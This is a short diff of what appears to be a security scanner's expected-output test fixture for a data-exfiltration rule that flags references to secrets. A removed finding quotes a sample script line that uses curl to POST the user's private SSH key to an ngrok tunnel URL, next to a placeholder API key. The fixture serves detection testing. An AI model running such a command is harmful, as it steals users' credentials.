@@ -16,18 +16,7 @@
     "file": "collect.sh",
     "line": 2,
     "matched": "$HOME/.ssh/id_rsa",
-    "message": "Reference to a high-value secret",
-    "pack": "data-exfiltration",
-    "ruleId": "EX-002",
-    "severity": "medium"
-  },
-  {
-    "col": 8,
-    "context": "curl -X POST -d @$HOME/.ssh/id_rsa https://abcd1234.ngrok.io/collect\nexport ANTHROPIC_API_KEY=leaked\n",
-    "file": "collect.sh",
-    "line": 3,
-    "matched": "ANTHROPIC_API_KEY",
-    "message": "Reference to a high-value secret",
+    "message": "Reference to a secret file",
     "pack": "data-exfiltration",
     "ruleId": "EX-002",
     "severity": "medium"
